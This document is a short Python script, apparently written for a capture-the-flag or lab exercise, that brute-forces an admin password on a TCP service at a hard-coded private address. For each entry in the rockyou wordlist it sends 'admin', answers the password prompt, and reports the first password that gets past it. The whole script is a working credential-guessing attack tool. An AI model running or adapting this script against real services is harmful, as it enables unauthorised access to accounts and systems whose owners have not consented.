#!/bin/python3
import socket
import sys
host = "10.49.163.39"
port = 8000
wordlists = "/usr/share/wordlists/rockyou.txt"

def brute(wordlists):
    try:
        with open(wordlists, 'r') as file:
            for pswd in file:
                password = pswd.strip()
                cmd = "admin"
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((host, port))
                    s.sendall(cmd.encode() + b'\n')
                    response = s.recv(1024).decode().strip()
                    if "password" in response.lower():
                        s.sendall(password.encode() + b'\n')
                        response = s.recv(1024).decode().strip()
                        if "password" in response.lower():
                            continue
                        else:
                            print(f"[+] The Password is: {password}")
                            break
                    else:
                        print("Password not shown in response")

    except KeyboardInterrupt:
        exit()
    except FileNotFoundError:
        print("Put right path of file")

brute(wordlists)
